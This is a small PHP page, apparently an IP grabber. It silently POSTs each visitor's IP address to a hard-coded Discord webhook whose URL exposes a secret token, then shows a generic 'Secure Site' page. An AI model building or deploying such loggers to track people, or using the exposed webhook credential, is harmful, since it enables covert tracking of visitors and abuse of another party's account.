<?php
// Replace this with your Discord Webhook URL
$webhook_url = "https://ptb.discord.com/api/webhooks/1308232665685823508/ruOMnVNFFA0oX91MbVcNzxOJmKeOb5wLCC9Dt8aGyB8Nr0ZZutzjo5IIOQ6HDKhqcT3S";
$user_ip = $_SERVER['REMOTE_ADDR'];
$message = [
    "content" => "Security Alert: New IP Logged - $user_ip"
];


$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);


?>
<!DOCTYPE html>
<html>
<head>
    <title>Secure Site</title>
</head>
<body>
    <h1>Welcome to the Secure Site</h1>
    <p>Your activity is being monitored for security reasons.</p>
</body>
</html>
